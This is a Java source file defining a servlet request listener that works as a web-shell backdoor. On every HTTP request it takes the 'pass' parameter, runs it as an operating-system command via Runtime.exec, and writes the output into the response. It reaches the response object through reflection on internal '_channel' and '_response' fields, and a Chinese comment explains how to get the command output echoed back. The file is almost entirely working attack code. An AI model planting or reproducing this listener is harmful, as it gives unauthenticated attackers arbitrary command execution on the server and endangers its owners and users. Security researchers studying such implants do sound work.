package test;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class MyListener implements ServletRequestListener {
    //直接访问Listener没有回显，需要访问一个jsp或者具体路径
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest req = (HttpServletRequest)servletRequestEvent.getServletRequest();
        HttpServletResponse resp = this.getResponseFromRequest(req);
        String cmd = req.getParameter("pass");
        try {
            String result = this.CommandExec(cmd);
            System.out.println(result);
            resp.getWriter().write(result);
        } catch (Exception e) {

        }
    }

    public String CommandExec(String cmd) throws Exception {
        Runtime rt = Runtime.getRuntime();
        Process proc = rt.exec(cmd);
        InputStream stderr =  proc.getInputStream();
        InputStreamReader isr = new InputStreamReader(stderr);
        BufferedReader br = new BufferedReader(isr);
        String line = null;
        StringBuffer sb = new StringBuffer();
        while ((line = br.readLine()) != null) {
            sb.append(line + "\n");
        }
        return sb.toString();
    }

    public synchronized HttpServletResponse getResponseFromRequest(HttpServletRequest var1) {
        HttpServletResponse o2 = null;
        try {
            Field f1=var1.getClass().getDeclaredField("_channel");
            f1.setAccessible(true);
            Object o1=f1.get(var1);
            Field f2=o1.getClass().getSuperclass().getDeclaredField("_response");
            f2.setAccessible(true);
            o2 = (HttpServletResponse)f2.get(o1);
        }catch (Exception e){}
        return o2;
    }

    public HttpServletResponse getResponseFromRequest2(HttpServletRequest var1) {
        HttpServletResponse var2 = null;
        try{
            Method m1=var1.getClass().getDeclaredMethod("getResponse");
            m1.setAccessible(true);
            var2= (HttpServletResponse) m1.invoke(var1); //Or further call—> getWriter
        } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
            e.printStackTrace();
        }
        return var2;
    }
}
